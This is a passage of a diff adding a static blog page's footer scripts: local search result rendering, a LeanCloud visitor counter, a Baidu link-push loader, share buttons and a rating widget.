+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("3zIUNafVjzYQz7AJMe457cT0-gzGzoHsz", "PzPKmCfoYOpSgHcoyql6etIG");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/needsharebutton/needsharebutton.css">
+
+  
+  
+  <script src="/lib/needsharebutton/needsharebutton.js"></script>
+
+  <script>
+    
+      pbOptions = {};
+      
+          pbOptions.iconStyle = "box";
+      
+          pbOptions.boxForm = "horizontal";
+      
+          pbOptions.position = "bottomCenter";
+      
+          pbOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-postbottom', pbOptions);
+    
+    
+      flOptions = {};
+      
+          flOptions.iconStyle = "box";
+      
+          flOptions.boxForm = "horizontal";
+      
+          flOptions.position = "middleRight";
+      
+          flOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-float', flOptions);
+    
+  </script>
+
+  
+  <script type="text/javascript">
+  wpac_init = window.wpac_init || [];
+  wpac_init.push({widget: 'Rating', id: 12981,
+    el: 'wpac-rating',
+    color: 'fc6423'
+  });
+  (function() {
+    if ('WIDGETPACK_LOADED' in window) return;
+    WIDGETPACK_LOADED = true;
+    var mc = document.createElement('script');
+    mc.type = 'text/javascript';
+    mc.async = true;
+    mc.src = '//embed.widgetpack.com/widget.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(mc, s.nextSibling);
+  })();
+  </script>
+
+
+  
+  
+
+
+  
+
+  
+  <script type="text/javascript" src="/js/src/exturl.js?v=5.1.4"></script>
+
+
+</body>
+</html>
